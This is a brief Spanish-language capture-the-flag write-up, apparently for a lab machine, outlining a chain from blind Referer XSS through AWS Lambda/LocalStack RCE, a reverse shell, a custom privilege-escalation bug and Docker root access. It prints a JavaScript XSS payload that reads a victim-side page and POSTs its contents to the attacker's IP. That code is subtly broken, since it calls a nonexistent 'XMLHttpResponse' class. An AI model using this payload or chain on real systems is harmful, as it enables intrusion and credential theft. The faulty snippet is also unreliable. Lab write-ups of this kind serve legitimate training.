## Tecnicas utilizadas
- Virtual Hosting Enumeration  
- Referer XSS Injection  
- XSS - Creating JS file (accessing unauthorized resources)  
- Checking/Reading mail through XSS injection  
- AWS Enumeration  
- Lambda Enumeration  
- Creating a Lambda Function (NodeJS)  
- Invoking the created lambda function  
- RCE on LocalStack  
- Abusing FunctionName Parameter (AWS) by exploiting XSS vulnerability (RCE)  
- Finding and exploiting custom 0Day [Privilege Escalation]  
- Root FileSystem Access by abusing Docker
## Procedimiento
- Virtual Hosting 
- Vhost Discovery
- XSS blind injection 
- Js scripting ->
```js
var target = "$IpVictima";
var req1 = new XMLHttpResponse();
req1.open("GET", target, false);
req1.send();

var response = req1.responseText;

var req2 = new XMLHttpResponse();
req2.open("POST", "$MiIp", false);
req2.send(response);
```
- Leakeo de credenciales de AWS
- Creamos una funcion en lambda basandonos en la documentacion de AWS 
- Nos aprovechamos del CVE de RCE tomando como base el campo vulnerable a XSS, redirijimos a la victima al dashboard con la funcion ``Document.location="$web"``
- Establacemos una reverse shell atraves de la vulnerabilidad 
- Explotamos el "0day custom"
- aprovechamos docker para escalar privilegios